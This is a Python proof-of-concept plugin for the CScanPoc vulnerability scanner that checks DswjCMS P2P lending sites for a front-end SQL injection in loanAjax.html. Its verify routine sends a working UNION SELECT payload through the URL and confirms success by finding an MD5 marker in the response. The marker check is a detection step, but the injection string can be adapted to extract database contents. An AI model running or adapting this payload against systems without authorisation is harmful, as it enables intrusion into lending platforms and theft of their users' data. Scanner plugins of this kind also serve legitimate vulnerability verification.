# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'DswjCMS_0004'  # 平台漏洞编号，留空
    name = 'DswjCMS p2p网贷系统前台sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-01-11'  # 漏洞公布时间
    desc = '''
        DswjCMS p2p网贷系统前台sql注入
        /Win/Index/loanAjax.html?type=1&state=0
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0141364'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DswjCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '166bda72-a869-4999-827e-5455c783461b'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/Win/Index/loanAjax.html?type=1&state=0"
            url = arg + payload + \
                ')+UNION+SELECT+1%2c2%2c3%2c(select+concat(0x5c%2cmd5(1))+from+information_schema.tables+limit+1)%2c5%2c6%2c7%2c8%2c9%2c10%2c11%2c12%2c13%2c14%2c15%2c16%2c17%2c18%2c19%2c20%2c21%2c22%2c23%2c24%2c25%2c26%2c27%2c28%2c29%2c30%2c31%2c32%2c33%2c34%23%26classify%3d1%26scope%3d1'
            code, head, res, errcode, finalurl = hh.http(url)
            if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
